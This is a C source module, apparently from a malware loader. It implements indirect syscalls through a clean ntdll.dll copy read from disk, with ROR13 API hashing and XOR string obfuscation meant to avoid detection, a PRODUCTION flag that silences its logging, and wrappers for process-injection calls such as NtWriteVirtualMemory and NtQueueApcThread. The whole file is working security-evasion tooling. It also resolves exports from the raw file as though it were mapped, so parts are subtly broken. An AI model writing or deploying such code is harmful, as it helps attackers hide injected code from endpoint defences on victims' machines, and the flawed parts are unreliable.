/*
 * Author: 28Zaakypro@proton.me
 * Syscalls Module - Indirect syscalls using fresh ntdll.dll copy
 * Extracts SSNs from clean ntdll, calls through "syscall; ret" gadget
 * Uses API hashing (ROR13) to avoid string detection
 */

#include "syscalls.h"
#include "obfuscation.h"
#include <stdio.h>
#include <string.h>

// ROR13 hash function for API resolution
static DWORD ror13_hash(const char* name) {
    DWORD hash = 0;
    while (*name) {
        hash = (hash >> 13) | (hash << (32 - 13)); // Rotate right 13 bits
        hash += (*name >= 'a') ? (*name - 0x20) : *name; // Convert to uppercase
        name++;
    }
    return hash;
}

// Syscall info structure
typedef struct _SYSCALL_INFO {
    DWORD ssn;
    PVOID syscallAddress;
} SYSCALL_INFO, *PSYSCALL_INFO;

#define SYSCALL_COUNT 12

// Precomputed ROR13 hashes for syscall functions
#define HASH_NtAllocateVirtualMemory  0x5947FD91
#define HASH_NtProtectVirtualMemory   0x1255C05B
#define HASH_NtFreeVirtualMemory      0x69A0287F
#define HASH_NtWriteVirtualMemory     0x4B2D0096
#define HASH_NtReadVirtualMemory      0xC92C187D
#define HASH_NtQueueApcThread         0x1126191E
#define HASH_NtResumeThread           0x63C738A0
#define HASH_NtClose                  0x9BD4442F
#define HASH_NtOpenProcess            0x8F879070
#define HASH_NtCreateFile             0xE2068364
#define HASH_NtReadFile               0x637ACCE6
#define HASH_NtWriteFile              0x668B0D03

enum {
    IDX_NtAllocateVirtualMemory = 0,
    IDX_NtProtectVirtualMemory,
    IDX_NtFreeVirtualMemory,
    IDX_NtWriteVirtualMemory,
    IDX_NtReadVirtualMemory,
    IDX_NtQueueApcThread,
    IDX_NtResumeThread,
    IDX_NtClose,
    IDX_NtOpenProcess,
    IDX_NtCreateFile,
    IDX_NtReadFile,
    IDX_NtWriteFile
};

static SYSCALL_INFO g_SyscallTable[SYSCALL_COUNT] = {0};
static PVOID g_FreshNtdll = NULL;
static BOOL g_Initialized = FALSE;

// Internal prototypes
static BOOL LoadFreshNtdll(void);
static PVOID FindSyscallAddress(PVOID moduleBase);
static PVOID GetFunctionByHash(PVOID moduleBase, DWORD hash);
static DWORD ExtractSSN(PVOID functionAddress);

// Assembly syscall stubs (dosyscall.S)
extern NTSTATUS DoSyscall(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3,
    PVOID arg4, PVOID arg5, PVOID arg6);

extern NTSTATUS DoSyscall11(
    DWORD ssn, PVOID syscallAddr,
    PVOID arg1, PVOID arg2, PVOID arg3, PVOID arg4,
    PVOID arg5, PVOID arg6, PVOID arg7, PVOID arg8,
    PVOID arg9, PVOID arg10, PVOID arg11);

// Loads ntdll.dll from disk (clean copy)
static BOOL LoadFreshNtdll(void)
{
    CHAR ntdllPath[MAX_PATH];
    GetSystemDirectoryA(ntdllPath, MAX_PATH);
    lstrcatA(ntdllPath, "\\ntdll.dll");

    HANDLE hFile = CreateFileA(ntdllPath, GENERIC_READ, FILE_SHARE_READ,
                                NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    DWORD fileSize = GetFileSize(hFile, NULL);
    g_FreshNtdll = VirtualAlloc(NULL, fileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    if (!g_FreshNtdll) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytesRead;
    if (!ReadFile(hFile, g_FreshNtdll, fileSize, &bytesRead, NULL)) {
        CloseHandle(hFile);
        return FALSE;
    }

    CloseHandle(hFile);
    return TRUE;
}

/*
 * FindSyscallAddress
 * ------------------
 * Searches for "syscall; ret" (0F 05 C3) in ntdll
 */
static PVOID FindSyscallAddress(PVOID moduleBase)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(ntHeaders);

    PVOID textBase = NULL;
    DWORD textSize = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; i++) {
        if (memcmp(section[i].Name, ".text", 5) == 0) {
            textBase = (BYTE *)moduleBase + section[i].VirtualAddress;
            textSize = section[i].Misc.VirtualSize;
            break;
        }
    }

    if (!textBase) return NULL;

    // Find "0F 05 C3" (syscall; ret)
    BYTE *current = (BYTE *)textBase;
    BYTE *end = current + textSize - 2;

    while (current < end) {
        if (current[0] == 0x0F && current[1] == 0x05 && current[2] == 0xC3) {
            return current;
        }
        current++;
    }

    return NULL;
}

// Finds function in Export Directory by ROR13 hash
static PVOID GetFunctionByHash(PVOID moduleBase, DWORD targetHash)
{
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)moduleBase;
    PIMAGE_NT_HEADERS64 ntHeaders = (PIMAGE_NT_HEADERS64)((BYTE *)moduleBase + dosHeader->e_lfanew);
    
    DWORD exportDirRva = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)moduleBase + exportDirRva);

    DWORD *addressOfFunctions = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfFunctions);
    DWORD *addressOfNames = (DWORD *)((BYTE *)moduleBase + exportDir->AddressOfNames);
    WORD *addressOfNameOrdinals = (WORD *)((BYTE *)moduleBase + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        char *currentName = (char *)((BYTE *)moduleBase + addressOfNames[i]);
        DWORD hash = ror13_hash(currentName);
        
        if (hash == targetHash) {
            WORD ordinal = addressOfNameOrdinals[i];
            DWORD functionRva = addressOfFunctions[ordinal];
            return (BYTE *)moduleBase + functionRva;
        }
    }

    return NULL;
}

// Extracts SSN from syscall function (mov eax, SSN pattern)
static DWORD ExtractSSN(PVOID functionAddress)
{
    BYTE *bytes = (BYTE *)functionAddress;

    // Check signature: mov r10, rcx
    if (bytes[0] != 0x4C || bytes[1] != 0x8B || bytes[2] != 0xD1) {
        return 0;
    }

    if (bytes[3] != 0xB8) {
        return 0;
    }

    return *(DWORD *)(bytes + 4);
}

// Public API
BOOL InitializeSyscallsModule(void)
{
    if (g_Initialized) {
        return TRUE;
    }

    #ifndef PRODUCTION
    printf("[*] Initializing indirect syscalls...\n");
    #endif

    if (!LoadFreshNtdll()) {
        #ifndef PRODUCTION
        printf("[-] Failed to load ntdll.dll\n");
        #endif
        return FALSE;
    }

    // Obfuscated "ntdll.dll" (XOR 0x42)
    BYTE obfNtdllName[] = {0x2C, 0x36, 0x26, 0x2E, 0x2E, 0x6C, 0x26, 0x2E, 0x2E};
    char ntdllName[16];
    DeobfuscateString(obfNtdllName, 9, 0x42, ntdllName);
    
    HMODULE hNtdll = GetModuleHandleA(ntdllName);
    PVOID syscallAddress = FindSyscallAddress(hNtdll);
    
    if (!syscallAddress) {
        #ifndef PRODUCTION
        printf("[-] Failed to find syscall instruction\n");
        #endif
        return FALSE;
    }

    // Precomputed hashes (no cleartext function names)
    DWORD functionHashes[] = {
        HASH_NtAllocateVirtualMemory,
        HASH_NtProtectVirtualMemory,
        HASH_NtFreeVirtualMemory,
        HASH_NtWriteVirtualMemory,
        HASH_NtReadVirtualMemory,
        HASH_NtQueueApcThread,
        HASH_NtResumeThread,
        HASH_NtClose,
        HASH_NtOpenProcess,
        HASH_NtCreateFile,
        HASH_NtReadFile,
        HASH_NtWriteFile
    };

    // Resolve all functions by hash
    for (int i = 0; i < SYSCALL_COUNT; i++) {
        PVOID funcAddr = GetFunctionByHash(g_FreshNtdll, functionHashes[i]);
        if (!funcAddr) {
            #ifndef PRODUCTION
            printf("[-] Function with hash 0x%08X not found\n", functionHashes[i]);
            #endif
            return FALSE;
        }

        DWORD ssn = ExtractSSN(funcAddr);
        if (ssn == 0) {
            #ifndef PRODUCTION
            printf("[-] SSN extraction failed for hash 0x%08X\n", functionHashes[i]);
            #endif
            return FALSE;
        }

        g_SyscallTable[i].ssn = ssn;
        g_SyscallTable[i].syscallAddress = syscallAddress;
    }

    g_Initialized = TRUE;
    #ifndef PRODUCTION
    printf("[+] Syscalls module initialized successfully\n");
    #endif
    #ifndef PRODUCTION
    printf("    %d syscalls disponibles\n\n", SYSCALL_COUNT);
    #endif
    
    return TRUE;
}

VOID CleanupSyscallsModule(void)
{
    if (g_FreshNtdll) {
        VirtualFree(g_FreshNtdll, 0, MEM_RELEASE);
        g_FreshNtdll = NULL;
    }
    g_Initialized = FALSE;
}

// WRAPPERS NTAPI
NTSTATUS SysNtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtAllocateVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)ZeroBits,
        (PVOID)RegionSize, (PVOID)(ULONG_PTR)AllocationType, (PVOID)(ULONG_PTR)Protect);
}

NTSTATUS SysNtProtectVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtProtectVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)NumberOfBytesToProtect,
        (PVOID)(ULONG_PTR)NewAccessProtection, (PVOID)OldAccessProtection, NULL);
}

NTSTATUS SysNtFreeVirtualMemory(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG FreeType)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtFreeVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)BaseAddress, (PVOID)RegionSize,
        (PVOID)(ULONG_PTR)FreeType, NULL, NULL);
}

NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToWrite, (PVOID)NumberOfBytesWritten, NULL);
}

NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToRead,
    PSIZE_T NumberOfBytesRead)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtReadVirtualMemory];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, BaseAddress, Buffer,
        (PVOID)NumberOfBytesToRead, (PVOID)NumberOfBytesRead, NULL);
}

NTSTATUS SysNtQueueApcThread(
    HANDLE ThreadHandle,
    PVOID ApcRoutine,
    PVOID ApcArgument1,
    PVOID ApcArgument2,
    PVOID ApcArgument3)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtQueueApcThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, ApcRoutine, ApcArgument1,
        ApcArgument2, ApcArgument3, NULL);
}

NTSTATUS SysNtResumeThread(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtResumeThread];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ThreadHandle, (PVOID)PreviousSuspendCount, NULL,
        NULL, NULL, NULL);
}

NTSTATUS SysNtClose(HANDLE Handle)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtClose];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)Handle, NULL, NULL, NULL, NULL, NULL);
}

NTSTATUS SysNtOpenProcess(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PCLIENT_ID ClientId)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtOpenProcess];
    return DoSyscall(
        info->ssn, info->syscallAddress,
        (PVOID)ProcessHandle, (PVOID)(ULONG_PTR)DesiredAccess, (PVOID)ObjectAttributes,
        (PVOID)ClientId, NULL, NULL);
}

NTSTATUS SysNtCreateFile(
    PHANDLE FileHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    PIO_STATUS_BLOCK IoStatusBlock,
    PLARGE_INTEGER AllocationSize,
    ULONG FileAttributes,
    ULONG ShareAccess,
    ULONG CreateDisposition,
    ULONG CreateOptions,
    PVOID EaBuffer,
    ULONG EaLength)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtCreateFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)(ULONG_PTR)DesiredAccess, (PVOID)ObjectAttributes,
        (PVOID)IoStatusBlock, (PVOID)AllocationSize, (PVOID)(ULONG_PTR)FileAttributes,
        (PVOID)(ULONG_PTR)ShareAccess, (PVOID)(ULONG_PTR)CreateDisposition,
        (PVOID)(ULONG_PTR)CreateOptions, EaBuffer, (PVOID)(ULONG_PTR)EaLength);
}

NTSTATUS SysNtReadFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtReadFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)Event, ApcRoutine, ApcContext,
        (PVOID)IoStatusBlock, Buffer, (PVOID)(ULONG_PTR)Length,
        (PVOID)ByteOffset, (PVOID)Key, NULL, NULL);
}

NTSTATUS SysNtWriteFile(
    HANDLE FileHandle,
    HANDLE Event,
    PVOID ApcRoutine,
    PVOID ApcContext,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID Buffer,
    ULONG Length,
    PLARGE_INTEGER ByteOffset,
    PULONG Key)
{
    SYSCALL_INFO *info = &g_SyscallTable[IDX_NtWriteFile];
    return DoSyscall11(
        info->ssn, info->syscallAddress,
        (PVOID)FileHandle, (PVOID)Event, ApcRoutine, ApcContext,
        (PVOID)IoStatusBlock, Buffer, (PVOID)(ULONG_PTR)Length,
        (PVOID)ByteOffset, (PVOID)Key, NULL, NULL);
}

// HELPERS WINAPI-LIKE
PVOID SysVirtualAlloc(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD flAllocationType,
    DWORD flProtect)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;
    
    NTSTATUS status = SysNtAllocateVirtualMemory(
        (HANDLE)-1,  // Current process
        &baseAddress,
        0,
        &regionSize,
        flAllocationType,
        flProtect);

    return NT_SUCCESS(status) ? baseAddress : NULL;
}

BOOL SysVirtualProtect(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD flNewProtect,
    PDWORD lpflOldProtect)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;
    ULONG oldProtect = 0;
    
    NTSTATUS status = SysNtProtectVirtualMemory(
        (HANDLE)-1,
        &baseAddress,
        &regionSize,
        flNewProtect,
        &oldProtect);

    if (lpflOldProtect) {
        *lpflOldProtect = oldProtect;
    }

    return NT_SUCCESS(status);
}

BOOL SysVirtualFree(
    PVOID lpAddress,
    SIZE_T dwSize,
    DWORD dwFreeType)
{
    PVOID baseAddress = lpAddress;
    SIZE_T regionSize = dwSize;
    
    NTSTATUS status = SysNtFreeVirtualMemory(
        (HANDLE)-1,
        &baseAddress,
        &regionSize,
        dwFreeType);

    return NT_SUCCESS(status);
}

BOOL SysCloseHandle(HANDLE hObject)
{
    NTSTATUS status = SysNtClose(hObject);
    return NT_SUCCESS(status);
}

HANDLE SysOpenProcess(
    DWORD dwDesiredAccess,
    BOOL bInheritHandle,
    DWORD dwProcessId)
{
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID clientId;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    clientId.UniqueProcess = (HANDLE)(ULONG_PTR)dwProcessId;
    clientId.UniqueThread = NULL;

    NTSTATUS status = SysNtOpenProcess(
        &hProcess,
        dwDesiredAccess,
        &objAttr,
        &clientId);

    return NT_SUCCESS(status) ? hProcess : NULL;
}
